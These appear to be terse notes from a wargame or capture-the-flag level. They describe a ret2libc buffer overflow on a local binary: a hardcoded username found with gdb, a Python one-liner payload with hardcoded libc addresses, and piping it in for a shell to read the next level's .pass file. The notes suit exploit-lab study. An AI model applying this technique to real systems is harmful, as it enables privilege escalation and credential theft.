pgm asks for username
fgets -> username

we can gdb and x/s the address compared, it is "dat_wil"

it works

pgm asks for password
fgets -> password

we can gdb and x/s the address compared, it is "admin"
doesn't work...

we can overflow in eip on password's fgets, offset is eip

ret2libc attack

also we can find address to system call and the one of "/bin/sh"

chmod 777 .
touch exploit
chmod 777 exploit
python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "BUFF" + "\xec\x97\xf8\xf7")' > exploit
cat exploit - | ./level1

we are inside shell as level02
we can cat level02's .pass
